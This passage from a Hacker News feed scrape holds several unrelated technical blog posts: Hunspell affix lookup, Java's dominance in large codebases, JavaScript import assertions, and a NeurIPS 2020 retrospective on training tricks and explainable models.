<p>Another benefit of splitting words into stems and affixes: when Hunspell’s user wants to add a new word to their personal dictionary, Hunspell allows to just specify “it is inflected the same way as (some other word)”, thus sparing the user of teaching the dictionary “‘monad’ is a word, and ‘monads’ too, as well as ‘monad’s’…”.</p>

<p>Note, though, that “suffixes” and “prefixes” specified in some language’s dictionary not necessarily correspond to <em>grammatical</em> suffixes/prefixes of the language. The splitting into stems and affixes is deduced automatically by dictionary authoring tools from flat word lists, so it is up to probabilities whether “common endings” deduced have any grammatical meaning. Actually, Hunspell’s format has a rich <a href="https://manpages.debian.org/experimental/libhunspell-dev/hunspell.5.en.html#Optional_data_fields">sub-language to specify grammatical information</a>, but of all LibreOffice and Firefox dictionaries I’ve checked, only a few (Latvian, Slovak, Galician, Breton) made use of this feature.</p>

<blockquote>
  <p>One important factor to mention is Hunspell’s limitation for the amount of suffixes/prefixes a word may have. Currently, the software understands no more than 2 suffixes and 2 prefixes in a word, which is lower than the common number of grammatical suffixes a lot of languages allow. Most of the dictionaries solve this by “linearizing” the word list: Ukrainian word “громадянство” (citizenship) grammatically consists of the stem “громад-“ and suffixes “-ян-“, “-ств-“, “-о” (the latter is called an ending in grammatically correct terms), but Hunspell’s Ukrainian dictionary includes the full word “громадянство”. For other languages, the suffix number limitation makes Hunspell totally unusable, so to spellcheck the Finnish, you need to install <a href="https://voikko.puimula.org/">Voikko</a> spellchecker.</p>
</blockquote>

<p><strong>Affix compression comes with a price</strong> paid in lookup algorithm complexity and performance. Instead of just a quick lookup through a hashtable or other lookup-optimized structure, we now have to:</p>

<ol>
  <li>Check if the whole word is in the list of stems. If yes, it is correct,
    <ul>
      <li>…unless it has a flag corresponding to the aff-file directive “this stem <em>requires</em> prefixes or suffixes”.</li>
    </ul>
  </li>
  <li>If no, check if the word has some of the known suffixes; and if so, whether the stem without one of those suffixes is in the stem list, <em>and</em> has a flag corresponding to this suffix.</li>
  <li>If no, check if one more suffix can be found in the stem (then we’ll have a stem and two suffixes, and need to check the compatibility of their flags).</li>
  <li>Repeat with prefixes (up to two), and with all possible suffix-prefix combination (taking into account whether suffix and prefix both have “cross-product” allowed).</li>
  <li>Consider that suffixes and prefixes can have flags of their own, specifying “suffixes with this flag might be attached after me”, or “if used, this suffix requires that at least one other affix would be present” and … many other things.</li>
  <li>And there are funny cases like <code>CIRCUMFIX</code> flag: if the suffix has it, this means that this suffix is only allowed in words having a prefix with the same flag.</li>
</ol>

<blockquote>
  <p>It is <em>still</em> a simplified description. To follow the algorithm in full, you can read Spylls docs starting from <a href="https://spylls.readthedocs.io/en/latest/hunspell/algo_lookup.html#spylls.hunspell.algo.lookup.Lookup.affix_forms"><code>Lookup.affix_forms</code></a>, follow the links to methods it invokes, and read inline comments under “Show code”.</p>
</blockquote>

<p>Performance-wise, for each word correctness check, there could be many lookups through known suffixes and prefixes lists, and quite a few dictionary lookups (as consecutive chopping off of suffixes and prefixes produces new stems we need to check).</p>

<p>And once you tackle the affixes problem, it is all uphill from there!</p>

<p><strong>Stay tuned for the next installment about the Hunspell lookup, where we’ll cover word compounding problem, and some other important edge cases of the word correctness check.</strong> Follow me <a href="https://twitter.com/zverok">on Twitter</a> or <a href="https://zverok.github.io/subscribe.html">subscribe to my mailing list</a> if you don’t want to miss the follow-up!</p>


  </article></div>]]>
            </description>
            <link>https://zverok.github.io/blog/2021-01-09-spellchecker-2.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25725583</guid>
            <pubDate>Mon, 11 Jan 2021 06:54:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My Personal Twitter Manifest]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25725385">thread link</a>) | @hgarg
<br/>
January 10, 2021 | https://harishgarg.com/writing/my-twitter-playbook/ | <a href="https://web.archive.org/web/*/https://harishgarg.com/writing/my-twitter-playbook/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://harishgarg.com/writing/my-twitter-playbook/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25725385</guid>
            <pubDate>Mon, 11 Jan 2021 06:27:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Software Leviathans and the weird dominance of good enough]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25725271">thread link</a>) | @Sevii
<br/>
January 10, 2021 | https://www.sledgeworx.io/software-leviathans-and-the-weird-dominance-of-good-enough/ | <a href="https://web.archive.org/web/*/https://www.sledgeworx.io/software-leviathans-and-the-weird-dominance-of-good-enough/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-527">
	
	<!-- .entry-header -->

	<div>
		
<blockquote><p>One day in Spring 1989, I was sitting out on the Lucid porch with some of the hackers, and someone asked me why I thought people believed C and Unix were better than Lisp. I jokingly answered, “because, well, worse is better.” We laughed over it for a while as I tried to make up an argument for why something clearly lousy could be good.</p><cite><a href="https://www.dreamsongs.com/WorseIsBetter.html">https://www.dreamsongs.com/WorseIsBetter.html</a></cite></blockquote>







<p><a href=""></a>It has long been wondered why Java took the crown for the ‘enterprise’ language. I can’t really argue on that topic since I came onto the scene long after Java was all there was. This article is about why software leviathans are written in Java more than anything else.&nbsp;</p>



<p>You have a huge software project to build. What language do you build it in? The prototype was written in ruby on rails by one guy and an Adderal prescription. Now they want you to scale this thing to a 1000+ engineers over 5 years of development. You might think “aha this is my chance, lets save an order of magnitude lines of code and use lisp”, except this story happened in the past and they chose Java.&nbsp;</p>



<p>Why is it always Java? Sure it’s reasonably fast, but Facebook made PHP work, can’t we at least use Haskell? Since we have the benefit of hindsight, we know that most of the biggest software systems are built in Java. Google built so many leviathans in Java that they bankrolled a new language like Java but with less features. Amazon is based on Java. Netflix is java again. Facebook made their own language and Microsoft is old enough to have existed before Java, but still made their own version of Java, C#.&nbsp;</p>



<p>The real question should be, “What is Java’s secret?”.&nbsp;</p>



<p><strong><em>Java requires a lot of boiler plate</em></strong></p>



<p>Java just plays well with the major constraints in a software leviathan and at Leviathan scale that is all that matters.&nbsp;</p>



<p>This one is the corollary of “Java doesn’t support meta-programming”. Creating your own DSL is great, 1000 engineers creating their own DSL is 999 nightmares. Software Leviathans are too big for any one engineering team to understand. Any DSL you create makes your code unintelligible to the rest of the people working in hell with you. I can understand boilerplate written by a monkey, but a DSL written by another software engineer could take me days to understand. When your team gets poached to go work on a startup where the code base isn’t humongous, it’s a lot easier to bring in Java programmers to replace you lot than it would be to get Haskell engineers to figure out your undocumented dialect.&nbsp;</p>



<p>Google got to the point where they figured Java had too much meta-programming ability so they created Go which is basically Java without inheritance. That is what happens when you work in a leviathan project. You begin to resent the ability of your peers to do anything unusual, because you know it’s just going to be more work for you.&nbsp;</p>



<p>Adding more onboarding time to understand 1) the functional language and 2) the DSL your team created might push our already long 6 month on-boarding period closer to the 1 year mark. I wrote an article about onboarding time and functional languages aimed at startups, but honestly I don’t think the hiring market is the real reason Java dominates the top end. FAANG is already willing to train new grads to work on their giant software projects.&nbsp;</p>



<p>It boils down to comprehension honestly. Humans can only comprehend so many things and at leviathan scale the max is a tiny fraction of the entire system.&nbsp;</p>



<p>In a software leviathan your team constantly works with other teams’ systems. How does this API work? There isn’t any documentation and one 30 minute office hours isn’t going to explain that hair ball. If you all use the same language and that language is Java there is a chance you can open up their code base and figure out what is going on. They probably didn’t do anything you wouldn’t expect like pre-allocating all of their memory and storing all objects into a ring buffer. But if they did do something crazy you can probably figure it out. Besides Java doesn’t have anything like Scalaz so you won’t be surprised by a functor where you weren’t expecting it.&nbsp;</p>



<p>Lets take the opposite side, away team work. You have been given the glorious task of implementing a new feature. But it’s impossible to do it cleanly without an API change in another team’s system. That team fully supports the change and has contributed 2 paragraphs to your architecture document describing the change to make in their system. But the change isn’t on their team’s roadmap so you are going to have to do it.&nbsp;</p>



<p>Getting their service to run and pass integration tests in your virtual development machine takes a week. Now you need to navigate their system where they have conveniently used dependency injection to ensure that you can’t know which of the 5 implementations of this interface is in play. Do you still wish the other team could use Clojure? You might never figure out the DSL.&nbsp;</p>



<p>Have you ever looked at somebody else’s Lisp code and wondered what was inside the variables? Now imagine this is your job and you will spend the next month making a 200 line change to a 100,000 line of code API service you didn’t know existed until this week. Except this will happen every quarter for the rest of your career.&nbsp;</p>



<p>People complain about how Java forces you to write the type of things everywhere, but for software leviathans this is a benefit. I can see helpful type signatures everywhere, whether I’m reading your code in my IDE, an email, an excerpt in an arch doc, or in a Slack message you sent me at 3 am.&nbsp;</p>



<p>Java and Go are great in Software Leviathans. You don’t have to worry about stumbling upon a programming mystery created 10 years ago by a disgruntled new grad. You can expect a consistent syntax and language whichever microservice you are working on. The code has self-documenting types that are ‘easy’ to understand. Honestly, they are a lot of benefits which make a tough coding environment a little more manageable.</p>
	</div><!-- .entry-content -->

	
	<!-- .entry-footer -->

</article></div>]]>
            </description>
            <link>https://www.sledgeworx.io/software-leviathans-and-the-weird-dominance-of-good-enough/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25725271</guid>
            <pubDate>Mon, 11 Jan 2021 06:12:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Import Assertions Coming to JavaScript]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25725187">thread link</a>) | @franciscop
<br/>
January 10, 2021 | https://2ality.com/2021/01/import-assertions.html#upcoming-features-based-on-import-assertions | <a href="https://web.archive.org/web/*/https://2ality.com/2021/01/import-assertions.html#upcoming-features-based-on-import-assertions">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a href="https://github.com/tc39/proposal-import-assertions">The ECMAScript proposal “Import assertions”</a> (by Myles Borins, Sven Sauleau, Dan Clark, and Daniel Ehrenberg) introduces syntax for associating metadata with import statements. In this blog post, we examine what that looks like and why it’s useful.</p>
<!--more-->
<hr>
<p><strong>Table of contents:</strong></p>
<nav><ul><li><a href="#import-assertions">Import assertions&nbsp;&nbsp;</a></li><li><a href="#history%3A-importing-non-javascript-artifacts-as-modules">History: importing non-JavaScript artifacts as modules&nbsp;&nbsp;</a></li><li><a href="#use-cases-for-importing-non-javascript-artifacts">Use cases for importing non-JavaScript artifacts&nbsp;&nbsp;</a></li><li><a href="#the-syntax-of-import-assertions">The syntax of import assertions&nbsp;&nbsp;</a><ul><li><a href="#static-import-statements">Static import statements&nbsp;&nbsp;</a></li><li><a href="#dynamic-imports">Dynamic imports&nbsp;&nbsp;</a></li><li><a href="#re-export-statements">Re-export statements&nbsp;&nbsp;</a></li></ul></li><li><a href="#upcoming-features-based-on-import-assertions">Upcoming features based on import assertions&nbsp;&nbsp;</a><ul><li><a href="#importing-webassembly">Importing WebAssembly&nbsp;&nbsp;</a></li></ul></li><li><a href="#further-reading-on-modules">Further reading on modules&nbsp;&nbsp;</a></li></ul></nav><hr>
<h2 id="import-assertions">Import assertions&nbsp;&nbsp;</h2>
<p>The motivating use case for import assertions was importing JSON data as a module. That looks as follows (and is further specified in <a href="https://github.com/tc39/proposal-json-modules">a separate proposal</a>):</p>
<pre><code><span>import</span> config <span>from</span> <span>'./data/config.json'</span> assert { <span>type</span>: <span>'json'</span> };
</code></pre>
<p>You may wonder why a JavaScript engine can’t use the filename extension <code>.json</code> to determine that this is JSON data. However, a core architectural principle of the web is to never use the filename extension to determine what’s inside a file. Instead, content types are used.</p>
<p>Therefore, there is a risk of doing importing wrong if a server has incorrectly configured content types. Specifying the necessary metadata at the import location solves this issue.</p>
<p>Before we take a more detailed look at how import assertions work, let’s examine the history of importing non-JavaScript artifacts in the world of JavaScript.</p>
<h2 id="history%3A-importing-non-javascript-artifacts-as-modules">History: importing non-JavaScript artifacts as modules&nbsp;&nbsp;</h2>
<p>Importing artifacts that are not JavaScript code as modules, has a long tradition in the JavaScript ecosystem.</p>
<p>For example, the JavaScript module loader RequireJS has support for so-called <a href="https://requirejs.org/docs/plugins.html"><em>plugins</em></a>. To give you a feeling for how old RequireJS is: Version 1.0.0 was released in 2009. Specifiers of modules that are imported via a plugin look like this:</p>
<pre><code>'«specifier-of-plugin-module»!«specifier-of-artifact»'
</code></pre>
<p>For example, the following module specifier imports a file as JSON:</p>
<pre><code>'json!./data/config.json'
</code></pre>
<p>Inspired by RequireJS, webpack supports the same module specifier syntax for its <a href="https://webpack.js.org/loaders/"><em>loaders</em></a>.</p>
<h2 id="use-cases-for-importing-non-javascript-artifacts">Use cases for importing non-JavaScript artifacts&nbsp;&nbsp;</h2>
<p>These are a few use cases for importing non-JavaScript artifacts:</p>
<ul>
<li>Importing JSON configuration data</li>
<li>Importing WebAssembly code as if it were a JavaScript module</li>
<li>Importing CSS to build user interfaces</li>
</ul>
<p>For more use cases, you can take a look at <a href="https://webpack.js.org/loaders/">the list of webpack’s loaders</a>.</p>
<h2 id="the-syntax-of-import-assertions">The syntax of import assertions&nbsp;&nbsp;</h2>
<p>Let’s examine in more detail what import assertions look like.</p>
<h3 id="static-import-statements">Static import statements&nbsp;&nbsp;</h3>
<p>We have already seen a normal (static) import statement:</p>
<pre><code><span>import</span> config <span>from</span> <span>'./data/config.json'</span> assert { <span>type</span>: <span>'json'</span> };
</code></pre>
<p>The import assertions start with the keyword <code>assert</code>. That keyword is followed by an object literal. For now, the following object literal features are supported:</p>
<ul>
<li>Unquoted keys and quoted keys</li>
<li>The values must be strings</li>
</ul>
<p>There are no other syntactic restrictions placed on the keys and the values, but engines are encouraged to throw an exception if they don’t support a key and/or a value. That makes it easier to add more features in the future because no one will use keys and values in unexpected ways.</p>
<h3 id="dynamic-imports">Dynamic imports&nbsp;&nbsp;</h3>
<p>To support import assertions, <a href="https://exploringjs.com/impatient-js/ch_modules.html#import-operator">dynamic imports</a> get a second parameter – an object with configuration data:</p>
<pre><code><span>import</span>(<span>'./data/config.json'</span>, { <span>assert</span>: { <span>type</span>: <span>'json'</span> } })
</code></pre>
<p>The import assertions don’t exist at the top level; they are specified via the property <code>assert</code>. That makes it possible to add more configuration options in the future.</p>
<h3 id="re-export-statements">Re-export statements&nbsp;&nbsp;</h3>
<p>A re-export imports and exports in a single step. For the former, we need assertions:</p>
<pre><code><span>export</span> { <span>default</span> <span>as</span> config } <span>from</span> <span>'./data/config.json'</span> assert { <span>type</span>: <span>'json'</span> };
</code></pre>
<h2 id="upcoming-features-based-on-import-assertions">Upcoming features based on import assertions&nbsp;&nbsp;</h2>
<p>Import assertions are really just syntax. They lay the foundation for actual features that make use of that syntax.</p>
<p>The first feature based on import assertions is probably going to be <a href="https://github.com/tc39/proposal-json-modules">JSON modules</a>.</p>
<h3 id="importing-webassembly">Importing WebAssembly&nbsp;&nbsp;</h3>
<p>Whether or not import assertions will be used to support directly importing WebAssembly from JavaScript is currently under <a href="https://github.com/tc39/proposal-import-assertions/issues/19">discussion</a>. If they are used, we’ll probably be able to create web workers like this:</p>
<pre><code><span>new</span> Worker(<span>'my-app.wasm'</span>, { <span>type</span>: <span>'module'</span>, <span>assert</span>: { <span>type</span>: <span>'webassembly'</span> } })
</code></pre>
<p>And we’d also need import assertions in HTML script elements:</p>
<pre><code><span>&lt;<span>script</span> <span>src</span>=<span>"my-app.wasm"</span> <span>type</span>=<span>"module"</span> <span>asserttype</span>=<span>"webassembly"</span>&gt;</span><span>&lt;/<span>script</span>&gt;</span>
</code></pre>
<h2 id="further-reading-on-modules">Further reading on modules&nbsp;&nbsp;</h2>
<p><a href="https://exploringjs.com/impatient-js/ch_modules.html">The chapter on “Modules”</a> in “JavaScript for impatient programmers” is an in-depth introduction to ECMAScript modules.</p>
</div></div>]]>
            </description>
            <link>https://2ality.com/2021/01/import-assertions.html#upcoming-features-based-on-import-assertions</link>
            <guid isPermaLink="false">hacker-news-small-sites-25725187</guid>
            <pubDate>Mon, 11 Jan 2021 06:03:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Retrospective of NeurIPS 2020]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25725099">thread link</a>) | @purzelrakete
<br/>
January 10, 2021 | https://feldberlin.com/articles/neurips-2020 | <a href="https://web.archive.org/web/*/https://feldberlin.com/articles/neurips-2020">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I am going to begin with some practical things that I have taken away from
NeurIPS this year. Careful setup and proper tuning of your models can make
a big difference in performance. An amazing example of this are Steffen
Rendle’s currently <a href="https://arxiv.org/abs/1905.01395">SOTA results</a> for
recommender ratings predictions on the Movielens 10M dataset, where a well
tuned baseline is able to <a href="https://paperswithcode.com/sota/collaborative-filtering-on-movielens-10m">beat years of
research</a>
on the topic.</p><h2>Bag of tricks</h2><p>Of course, setup and proper tuning is hard, so knowing current tricks for
particular architectures, as well as how to combine them all together, is
super useful.  There are several bag of tricks summary papers that I know of
for CNNs <sup id="fnref-1"><a href="#fn-1">1</a></sup> <sup id="fnref-2"><a href="#fn-2">2</a></sup>, and I would love to hear about more. I found two more
promising methods at NeurIPS this year that I will definitely try out.</p><h3>Curriculum by Smoothing</h3><div><p>Note</p><div><p>Suddenly, I found myself implementing convolutions in javascript. Anything to avoid writing? Use the slider to see the effect of annealing the standard deviation on the kernel and image.</p><figure><figcaption>Slide me 🤔 <span> <!-- -->0.40</span></figcaption></figure><figure><canvas height="181" width="246"></canvas><figcaption>Fig 1. Dürer's Rhinoceros</figcaption></figure></div></div><p>Curriulum learning is the idea of breaking a learning task down into units of
progressively increasing difficulty, which is pretty much how humans learn.
Curriculum by Smoothing <sup id="fnref-3"><a href="#fn-3">3</a></sup> by Sinha et al proposes to apply this idea to CNN
training. During early training, filters learned by the CNN will include
high frequency data in the produced feature maps. These are details at very
small scales. To illustrate the type of information we are talking about,
let’s take a brief look at JPG compression:</p><blockquote><p>Human vision has a drop-off at higher frequencies, and de-emphasizing (or
even removing completely) higher frequency data from an image will give an
image that appears very different to a computer, but looks very close to the
original to a human. The quantization stage uses this fact to remove high
frequency information, which results in a smaller representation of the
image. <sup id="fnref-4"><a href="#fn-4">4</a></sup></p></blockquote><p>As it turns out, removing high frequency information during early training
makes the learning problem easier. In this paper, high frequency data is
removed at the beginning of training, and is exponentially annealed such that
by the end of the training process, we are training on the original feature
maps.</p><p>Annealing is done by reducing the variance of the gaussian kernel. This makes
the gaussian more peaky and reduces the smoothing effect, until in the extreme
case the kernel will have no effect at all. Have a play with the sidenote to
see the effect.</p><p>The numbers presented in the paper look great 👏🏽. A resnet-18 baseline
trained on imagenet obtains 68% top-1 accuracy, while using this training
method the authors obtain 71% top-1 accuracy. Have a look at the paper for
more details on transfer learning performance.</p><p>This work was done at the University of Toronto pair lab, and the github code
provided by the very friendly lead author <span><a href="https://twitter.com/_sam_sinha_">Sam Sinha<!-- --> <img src="data:image/svg+xml;base64,PHN2ZyBpZD0iTG9nb19GSVhFRCIgZGF0YS1uYW1lPSJMb2dvIOKAlCBGSVhFRCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB2aWV3Qm94PSIwIDAgNDAwIDQwMCI+PGRlZnM+PHN0eWxlPi5jbHMtMXtmaWxsOm5vbmU7fS5jbHMtMntmaWxsOiMxZGExZjI7fTwvc3R5bGU+PC9kZWZzPjx0aXRsZT5Ud2l0dGVyX0xvZ29fQmx1ZTwvdGl0bGU+PHJlY3QgY2xhc3M9ImNscy0xIiB3aWR0aD0iNDAwIiBoZWlnaHQ9IjQwMCIvPjxwYXRoIGNsYXNzPSJjbHMtMiIgZD0iTTE1My42MiwzMDEuNTljOTQuMzQsMCwxNDUuOTQtNzguMTYsMTQ1Ljk0LTE0NS45NCwwLTIuMjIsMC00LjQzLS4xNS02LjYzQTEwNC4zNiwxMDQuMzYsMCwwLDAsMzI1LDEyMi40N2ExMDIuMzgsMTAyLjM4LDAsMCwxLTI5LjQ2LDguMDcsNTEuNDcsNTEuNDcsMCwwLDAsMjIuNTUtMjguMzcsMTAyLjc5LDEwMi43OSwwLDAsMS0zMi41NywxMi40NSw1MS4zNCw1MS4zNCwwLDAsMC04Ny40MSw0Ni43OEExNDUuNjIsMTQ1LjYyLDAsMCwxLDkyLjQsMTA3LjgxYTUxLjMzLDUxLjMzLDAsMCwwLDE1Ljg4LDY4LjQ3QTUwLjkxLDUwLjkxLDAsMCwxLDg1LDE2OS44NmMwLC4yMSwwLC40MywwLC42NWE1MS4zMSw1MS4zMSwwLDAsMCw0MS4xNSw1MC4yOCw1MS4yMSw1MS4yMSwwLDAsMS0yMy4xNi44OCw1MS4zNSw1MS4zNSwwLDAsMCw0Ny45MiwzNS42MiwxMDIuOTIsMTAyLjkyLDAsMCwxLTYzLjcsMjJBMTA0LjQxLDEwNC40MSwwLDAsMSw3NSwyNzguNTVhMTQ1LjIxLDE0NS4yMSwwLDAsMCw3OC42MiwyMyIvPjwvc3ZnPg==" alt="twitter profile"></a></span> is <a href="http://www.github.com/pairlab/CBS">available
here</a>.</p><h3>Hyperparameter search with ensembles of optimizers</h3><div><p>Note</p><p>These optimisers use gaussian processes to model your metric over the parameter space. The framework for this is to loop over a suggest - observe cycle as many times as your budget allows for:</p><ul><li>get suggestions from your optimiser</li><li>observe result and update model</li></ul><p>Observations can be done in parallelized batches.</p><p><em>Ensembling of two optimisers can be done as follows: take half of the observations from each optimiser, and use them to update the other optimiser.</em></p></div><p>I have never gotten far past random search when it comes to automated tuning
of hyperparameters. I suppose that effective hyperparameter tuning continues
to be a matter of experience <sup id="fnref-5"><a href="#fn-5">5</a></sup>, hat tip to Henry from
<a href="https://www.dragonfly.co.nz/">dragonfly</a> for pointing out this paper.</p><p>Nevertheless, I always wondered what some of the cloud hyperparameter tuning
offerings cloud could do. Thanks to the <a href="https://bbochallenge.com/">NeurIPS black box optimization
challenge</a>, which ran as part of the competitions
programme, I might have something new to try out myself instead. Results can
be seen on the leaderboard, along with papers and code for some of the
contestants.</p><p>My main takeaway is that large improvements could be made to off-the-shelf
black box optimisers through ensembling of readily available open source
implementations. This paper by Nvidia RAPIDS <sup id="fnref-6"><a href="#fn-6">6</a></sup> found that combining
<a href="https://github.com/uber-research/TuRBO">Turbo</a> with either
<a href="https://github.com/hyperopt/hyperopt">Hyperopt</a> or <a href="https://scikit-optimize.github.io/stable/">Scikit
Optimize</a> yielded good results.</p><h2>Accountability</h2><div><p>Note</p><p>The firing of <a href="https://en.wikipedia.org/wiki/Timnit_Gebru">Timnit Gebru</a> from Google overshadowed the positive developments at NeurIPS. This <a href="https://www.technologyreview.com/2020/12/04/1013294/google-ai-ethics-research-paper-forced-out-timnit-gebru/">article</a> by technology review summarises the situation. I hope Timnit can continue to make a positive impact somewhere more thankful.</p><p>In the meantime, Google could spend some time <a href="https://www.amazon.com/Search-Inside-Yourself-Unexpected-Achieving/dp/0062116932">searching inside itself</a>.</p></div><p>For me, this was the year that the broader impact of AI is truly being seen
and addressed by the community. You can’t just hide out in your workplace,
tuning hyperparameter while ignoring developments in the world at large. This
<a href="https://nips.cc/virtual/2020/public/invited_16166.html">wonderful keynote</a> on
the topic by <span><a href="https://twitter.com/isbellhfh">Charles Isbel<!-- --> <img src="data:image/svg+xml;base64,PHN2ZyBpZD0iTG9nb19GSVhFRCIgZGF0YS1uYW1lPSJMb2dvIOKAlCBGSVhFRCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB2aWV3Qm94PSIwIDAgNDAwIDQwMCI+PGRlZnM+PHN0eWxlPi5jbHMtMXtmaWxsOm5vbmU7fS5jbHMtMntmaWxsOiMxZGExZjI7fTwvc3R5bGU+PC9kZWZzPjx0aXRsZT5Ud2l0dGVyX0xvZ29fQmx1ZTwvdGl0bGU+PHJlY3QgY2xhc3M9ImNscy0xIiB3aWR0aD0iNDAwIiBoZWlnaHQ9IjQwMCIvPjxwYXRoIGNsYXNzPSJjbHMtMiIgZD0iTTE1My42MiwzMDEuNTljOTQuMzQsMCwxNDUuOTQtNzguMTYsMTQ1Ljk0LTE0NS45NCwwLTIuMjIsMC00LjQzLS4xNS02LjYzQTEwNC4zNiwxMDQuMzYsMCwwLDAsMzI1LDEyMi40N2ExMDIuMzgsMTAyLjM4LDAsMCwxLTI5LjQ2LDguMDcsNTEuNDcsNTEuNDcsMCwwLDAsMjIuNTUtMjguMzcsMTAyLjc5LDEwMi43OSwwLDAsMS0zMi41NywxMi40NSw1MS4zNCw1MS4zNCwwLDAsMC04Ny40MSw0Ni43OEExNDUuNjIsMTQ1LjYyLDAsMCwxLDkyLjQsMTA3LjgxYTUxLjMzLDUxLjMzLDAsMCwwLDE1Ljg4LDY4LjQ3QTUwLjkxLDUwLjkxLDAsMCwxLDg1LDE2OS44NmMwLC4yMSwwLC40MywwLC42NWE1MS4zMSw1MS4zMSwwLDAsMCw0MS4xNSw1MC4yOCw1MS4yMSw1MS4yMSwwLDAsMS0yMy4xNi44OCw1MS4zNSw1MS4zNSwwLDAsMCw0Ny45MiwzNS42MiwxMDIuOTIsMTAyLjkyLDAsMCwxLTYzLjcsMjJBMTA0LjQxLDEwNC40MSwwLDAsMSw3NSwyNzguNTVhMTQ1LjIxLDE0NS4yMSwwLDAsMCw3OC42MiwyMyIvPjwvc3ZnPg==" alt="twitter profile"></a></span> is worth your
time:</p><blockquote><p>Successful technological fields have a moment when they become pervasive,
important, and noticed. They are deployed into the world and, inevitably,
something goes wrong. … The field must then choose to mature and take
responsibility for avoiding the harms associated with what it is producing.
Machine learning has reached this moment.</p></blockquote><p>I do think the tone here is telling, and that many in the field still refuse
to think about their personal accountability. It is something I would like to
think about a lot more in 2021.</p><p>Systems out there are already making life changing decisions for potentially
vulnerable people, without providing any path to recourse. However, being able
to explain your predictions is an important part of providing recourse for
your system.</p><p>Next up, a tutorial on <a href="https://slideslive.com/38935789/explaining-machine-learning-predictions-stateoftheart-challenges-opportunities">explaining machine learning
predictions</a>.</p><p>Two paths towards explainable systems are to either make the system inherently
explainable, or to provide post hoc explanations of black box systems.</p><h3>Explainable models</h3><div><p>Note</p><p>According to ProPublica, "COMPAS is a proprietary score developed to predict recidivism risk, which is used to inform bail, sentencing and parole decisions and has been the subject of scrutiny for racial bias". See this <a href="https://www.propublica.org/article/machine-bias-risk-assessments-in-criminal-sentencing">ProPublica investigation</a> to learn more about COMPAS.</p><p><em>Getting visibility into the these behaviours allows us to change the model to create more fair outcomes. In this case, we could simply remove race from the model. Frankly, this should have been done from the outset.</em></p></div><p>The easiest way to obtain explanations for your model is to start with a model
that is already explainable. <a href="https://en.wikipedia.org/wiki/Generalized_additive_model">Generalised additive
models</a>, described
by Hastie and Tibshirani in the early 90’s, are one such model.  Here is the
formulation for regression:</p><p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="double-struck">E</mi><mo stretchy="false">(</mo><mi>Y</mi><mi mathvariant="normal">∣</mi><msub><mi>X</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>X</mi><mn>2</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>X</mi><mi>p</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mi>α</mi><mo>+</mo><msub><mi>f</mi><mn>1</mn></msub><mo stretchy="false">(</mo><msub><mi>X</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>+</mo><msub><mi>f</mi><mn>2</mn></msub><mo stretchy="false">(</mo><msub><mi>X</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><msub><mi>f</mi><mi>p</mi></msub><mo stretchy="false">(</mo><msub><mi>X</mi><mi>p</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\mathbb{E}(Y|X_1, X_2, ..., X_p) = \alpha + f_1(X_1) + f_2(X_2) + ... + f_p(X_p)</annotation></semantics></math></span></span></p><p>The functions <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi></mrow><annotation encoding="application/x-tex">f</annotation></semantics></math></span></span> can be directly inspected after learning.</p><p>This glassbox model has recently popped up in various places, including <a href="https://www.microsoft.com/en-us/research/people/rcaruana/">Rich
Caruna’s</a> EMNLP
keynote a few weeks ago. It is one of a family of algorithms <sup id="fnref-7"><a href="#fn-7">7</a></sup> that can be
readily interpreted. As an aside, Rich Caruna’s group has brought GAMs into
the world of deep learning <sup id="fnref-8"><a href="#fn-8">8</a></sup>, in the hopes of kickstarting research into
glassbox deep learning. The model simply sums over <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span></span> independent feed
forward networks that respectively process one feature at a time. Code is
<a href="https://github.com/google-research/google-research/tree/master/neural_additive_models">available
here</a>,
<a href="https://twitter.com/nickfrosst/status/1255889440083447810">tweetprint here</a>.</p><div><figure><img src="https://feldberlin.com/static/compas-e90fb224e6a52ce3c6f583ba1d13de91.png"><figcaption>Fig 2. GAM shape functions learned in a prediction task</figcaption></figure><div><p>Here we see the risk of re-offence for released prisoners. The shape function
for race suggests that the learned model is racially biased: black
defendants are predicted to be higher risk for reoffending than white or Asian
defendants.</p><p>See the paper <sup id="fnref-8"><a href="#fn-8">8</a></sup> for full details.</p></div></div><p>Another method is to train a more powerful black box model, and then to use
model distillation to train a student glassbox explainer model.</p><h3>Post hoc explanations</h3><p>The tutorial was however largely focussed on post hoc explanations.
These treat the model as a black box. Explanations are developed around
